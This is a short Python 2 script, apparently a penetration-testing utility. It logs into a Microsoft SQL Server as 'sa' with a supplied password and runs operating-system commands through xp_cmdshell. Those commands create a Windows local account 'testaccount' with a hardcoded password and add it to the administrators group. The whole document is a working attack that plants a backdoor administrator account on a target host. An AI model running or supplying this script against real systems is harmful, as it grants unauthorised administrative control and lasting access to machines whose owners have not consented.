import _mssql
ipaddr = raw_input("Enter IP address to add user: ")
pw = raw_input("Enter the pw for SQL server: ")
target_server = _mssql.connect(ipaddr, "sa", pw)
target_server.select_db('master')
print "[*] Adding testaccount with password of P@55w0rd!"
target_server.execute_query("xp_cmdshell 'net user testaccount P@55w0rd! /ADD'")
target_server.execute_query("xp_cmdshell 'net localgroup administrators testaccount /ADD'")
